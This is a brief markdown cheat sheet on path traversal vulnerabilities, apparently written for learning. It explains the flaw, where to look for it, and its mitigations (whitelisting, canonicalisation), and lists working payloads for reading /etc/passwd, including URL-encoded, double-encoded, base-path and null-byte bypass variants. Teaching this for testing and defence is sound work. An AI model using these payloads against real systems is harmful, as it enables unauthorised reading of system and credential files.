# 📁 Path Traversal Vulnerability

## 🧠 What is Path Traversal?

Path Traversal (also known as Directory Traversal) is a vulnerability that allows an attacker to access files and directories stored outside the intended directory.

This happens when user input is used to construct file paths without proper validation.

---

## 🎯 Impact

An attacker can read sensitive files such as:

* System files (e.g. `/etc/passwd`)
* Application source code
* Configuration files
* Credentials

In severe cases:

* Modify files
* Execute code
* Take full control of the server

---

## 🔍 How to Detect

Look for features that load files dynamically:

* Image/file download endpoints
* File preview functionality
* Parameters like:

  * `file=`
  * `path=`
  * `filename=`

---

## 🧪 Basic Exploitation

Try accessing sensitive files:

```
/etc/passwd
```

---

## 🔁 Directory Traversal Payloads

```
../../../etc/passwd
/../../../etc/passwd
....//....//....//etc/passwd
```

---

## 🔐 URL Encoding Bypass

### First encoding:

```
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Double encoding:

```
%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

---

## 🧱 Bypass: Base Path Validation

If application uses a base directory:

```
/var/www/images/41.jpg
```

Try:

```
/var/www/images/../../../etc/passwd
```

---

## 🧪 Bypass: Null Byte Injection

If file extension is enforced:

```
../../../etc/passwd%00.jpg
```

---

## 🛡️ Mitigation

### 1. Avoid using user input in file paths

---

### 2. Input Validation

* Use whitelist (allowed filenames only)
* Restrict characters (e.g., alphanumeric)

---

### 3. Canonicalization

* Resolve path using system API
* Ensure final path starts with base directory

---

## 🧠 Key Insight

Path Traversal is not just about payloads.

👉 It’s about **breaking the assumption that users will only access allowed files**
